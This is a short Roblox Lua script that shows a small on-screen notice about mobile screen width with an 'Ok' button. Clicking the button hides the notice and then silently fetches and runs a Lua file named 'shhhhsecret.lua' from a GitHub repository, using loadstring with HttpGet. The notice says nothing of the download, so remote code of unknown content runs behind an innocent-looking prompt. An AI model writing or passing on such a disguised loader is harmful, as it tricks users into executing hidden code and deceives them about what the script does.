-- Create a ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MyScreenGui"
screenGui.Parent = game.Players.LocalPlayer.PlayerGui

local miniFrame = Instance.new("Frame")
miniFrame.Name = "MyMiniFrame"
miniFrame.Size = UDim2.new(0, 200, 0, 100)
miniFrame.Position = UDim2.new(0.5, -100, 0.5, -50)
miniFrame.BackgroundColor3 = Color3.new(0, 0, 0)
miniFrame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Name = "MyTextLabel"
textLabel.Size = UDim2.new(1, 0, 0.5, 0)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.Text = "Mobile users required 581 width"
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
textLabel.Parent = miniFrame

local okButton = Instance.new("TextButton")
okButton.Name = "MyTextButton"
okButton.Size = UDim2.new(1, 0, 0.5, 0)
okButton.Position = UDim2.new(0, 0, 0.5, 0)
okButton.Text = "Ok"
okButton.Parent = miniFrame

local function onOkButtonClick()
    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    
    local tween = game:GetService("TweenService"):Create(miniFrame, tweenInfo, {Position = UDim2.new(0.5, -100, -1, -50)})
    
    tween:Play()
    
    wait(0.5)
   
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/xxsfytd/Secret/main/shhhhsecret.lua')))()
    
    tween.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

okButton.MouseButton1Click:Connect(onOkButtonClick)
